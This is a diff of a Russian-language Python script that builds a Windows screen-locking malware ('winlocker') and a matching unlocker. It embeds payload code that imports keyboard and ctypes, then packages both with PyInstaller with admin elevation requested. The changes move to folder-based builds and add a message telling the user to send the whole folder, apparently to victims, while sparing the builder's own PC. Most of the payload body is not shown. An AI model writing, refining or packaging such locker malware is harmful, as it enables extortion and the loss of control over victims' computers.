@@ -114,7 +114,6 @@ ASCII_ART = r"""
                                                     ═══════════════════════════════════════════
 """
 
-
 PAYLOAD_CODE = '''import sys, os, ctypes, time, threading, subprocess, socket, getpass, shutil
 import tkinter as tk
 import keyboard
@@ -336,7 +335,6 @@ if __name__ == "__main__":
     main()
 '''
 
-
 UNLOCKER_CODE = '''import os, sys, ctypes, subprocess, time
 import winreg
 import tkinter as tk
@@ -439,7 +437,7 @@ print("[+] Созданы volt_payload.py и unlocker.py")
 print("\n[*] Собираю", OUTPUT_NAME + ".exe ...")
 cmd1 = [
     sys.executable, "-m", "PyInstaller",
-    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
+    "--noconfirm", "--onedir", "--windowed", "--uac-admin",
     "--name", OUTPUT_NAME,
     "volt_payload.py"
 ]
@@ -451,7 +449,7 @@ subprocess.run(cmd1)
 print("\n[*] Собираю Unlocker.exe ...")
 cmd2 = [
     sys.executable, "-m", "PyInstaller",
-    "--noconfirm", "--onefile", "--windowed", "--uac-admin",
+    "--noconfirm", "--onedir", "--windowed", "--uac-admin",
     "--name", "Unlocker",
     "unlocker.py"
 ]
@@ -471,6 +469,7 @@ for f in ["volt_payload.py", "unlocker.py", "build_all.py", "selfbuild.py", "lau
 print("\n" + "=" * 60)
 print("  ГОТОВО!")
 print("=" * 60)
-print(f"\n  dist\\{OUTPUT_NAME}.exe  — винлокер")
-print(f"  dist\\Unlocker.exe         — чистильщик")
-print(f"\n[!] На этом ПК ({CURRENT_PC_NAME}\\{CURRENT_USER}) винлокер не запустится")
+print(f"\n  dist\\{OUTPUT_NAME}\\{OUTPUT_NAME}.exe  — винлокер")
+print(f"  dist\\Unlocker\\Unlocker.exe              — чистильщик")
+print(f"\n[!] Отправляй ВСЮ папку (exe + _internal), не только exe.")
+print(f"[!] На этом ПК ({CURRENT_PC_NAME}\\{CURRENT_USER}) винлокер не запустится")
